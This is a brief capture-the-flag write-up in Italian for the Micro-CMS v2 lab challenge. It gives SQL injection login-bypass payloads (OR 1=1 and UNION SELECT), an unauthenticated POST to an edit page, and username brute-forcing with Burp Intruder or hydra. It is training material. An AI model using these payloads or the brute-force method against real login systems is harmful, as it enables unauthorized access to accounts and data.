# Micro-CMS v2

## flag0

+ Creare nuova pagina, viene chiesto login

+ [username] admin [password] password => 'Unknown user'

+ [username] admin'sqltest [password] password => 'Traceback'

![picture](imgs/1.png)

+ [username] admin' OR 1=1# [password] password => 'Invalid password' => quindi admin(true) e password(false)

+ [username] admin= admin' UNION SELECT 'pwned'# [password] pwned   (craftata guardando la query nell'error)

+ Flag si trova in una pagina che esce dopo aver loggato

![picture](imgs/2.png)

## flag1

+ POST request su edit page (curl , burpsuite , etc.)

## flag2

+ Hint dice: "Credentials are secret, flags are secret. Coincidence?"

+ Torno su login, admin' OR 1=1#:password => 'Invalid password' 

+ [username] admin = dipa' OR 1=1# [password] 'bruteforce con wordlist di username'

+ Io l'ho fatto con intruder di burpsuite, può essere fatto anche con hydra o tool simili.

+ [wordlist](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt)
 